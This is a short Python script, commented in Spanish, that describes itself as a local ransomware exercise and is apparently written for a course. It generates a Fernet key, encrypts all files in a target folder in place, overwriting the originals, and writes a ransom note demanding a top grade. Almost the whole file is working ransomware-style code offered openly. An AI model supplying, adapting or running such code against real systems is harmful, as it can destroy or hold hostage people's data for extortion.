"""
Estos archivos se basan en realizar Ramsomware, que basicamente es que los ciberatacadores
cifran archivos del disco y piden un rescate para su descifrado.
En este caso se realiza a nivel local, es decir, desde nuestro equipo
"""
#Este archivo se basa en la encriptación de los archivos que seleccionamos

#En primer lugar, usaremos el método Fernet de la librería cryptography
#Además de emplementar la librería os que nos permitirá encriptar los archivos
from cryptography.fernet import Fernet
import os

#Generamos la Clave de cifrado/encriptación
def generar_password():
    key = Fernet.generate_key()
    with open('key.key', "wb") as key_file: #Guardamos la Clave y la llamamos Key.Key
        key_file.write(key)

#Cargamos la Clave
def cargar_password():
    return open('key.key', 'rb').read() #Leemos la Clave

#La Función de encrypt se va a basar en encriptar los archivos
def encrypt(items, key): #Los Parámetros son los item que vamos a encriptar y la clave de encriptación
    f = Fernet(key) #Decimos cual es nuestra Clave
    #Con el Bucle for iteramos por cada elemento que vamos a encriptar
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()

        encrypted_data = f.encrypt(file_data) #En este paso, encriptamos el archivo
        with open(item, 'wb') as file:
            file.write(encrypted_data)

#A continuación, el método siguiente se usa para comprobar que se ha encriptado correctamente
if __name__ == '__main__':
    #Directorio que vamos a encriptar
    path_to_encrypt = "archivo"
    #Obtenemos los archivos del Directorio que vamos a encriptar y lo guardamos en una lista
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]

    generar_password() #Generamos Clave
    key = cargar_password() #Cargamos Clave

    encrypt(full_path, key) #Encriptación de los Archivo

    #Por último este paso es opcional, ya que vamos a crear un archivo que contenga un mensaje para que el dueño de los archivo lo vea
    with open(path_to_encrypt+"\\"+'archivoRescate.txt', 'w') as file:
        #Introduccimos la información que queremos que haya en dicho archivo
        file.write("Ficheros Encriptados"+"\n")
        file.write("Un 10 en la Asignatura para Liberarlos")

